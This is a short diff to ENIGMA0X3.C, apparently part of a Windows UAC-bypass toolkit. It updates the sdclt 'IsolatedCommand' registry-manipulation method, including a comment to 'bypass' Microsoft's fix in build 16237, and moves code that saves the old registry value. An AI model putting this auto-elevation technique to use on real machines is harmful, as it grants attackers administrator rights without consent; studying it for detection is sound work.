@@ -4,9 +4,9 @@
 *
 *  TITLE:       ENIGMA0X3.C
 *
-*  VERSION:     2.89
+*  VERSION:     2.90
 *
-*  DATE:        14 Jun 2018
+*  DATE:        16 July 2018
 *
 *  Enigma0x3 autoelevation methods and everything based on the same
 *  ShellExecute related registry manipulations idea.
@@ -478,21 +478,22 @@ BOOL ucmSdcltIsolatedCommandMethod(
         // There is a fix of original concept in 16237 RS3.
         // Bypass it.
         //
-        if (g_ctx.dwBuildNumber >= 16237)
+        if (g_ctx.dwBuildNumber >= 16237) {
             lpTargetValue = TEXT("");
+        }
         else {
             lpTargetValue = T_ISOLATEDCOMMAND;
-
-            //
-            // Save old value if exist.
-            //
-            cbOldData = MAX_PATH * 2;
-            RtlSecureZeroMemory(&szOldValue, sizeof(szOldValue));
-            lResult = RegQueryValueEx(hKey, lpTargetValue, 0, NULL,
-                (BYTE*)szOldValue, &cbOldData);
-            if (lResult == ERROR_SUCCESS)
-                bExist = TRUE;
         }
+
+        //
+        // Save old value if exist.
+        //
+        cbOldData = MAX_PATH * 2;
+        RtlSecureZeroMemory(&szOldValue, sizeof(szOldValue));
+        lResult = RegQueryValueEx(hKey, lpTargetValue, 0, NULL,
+            (BYTE*)szOldValue, &cbOldData);
+        if (lResult == ERROR_SUCCESS)
+            bExist = TRUE;
 
         cbData = (DWORD)((1 + sz) * sizeof(WCHAR));
 
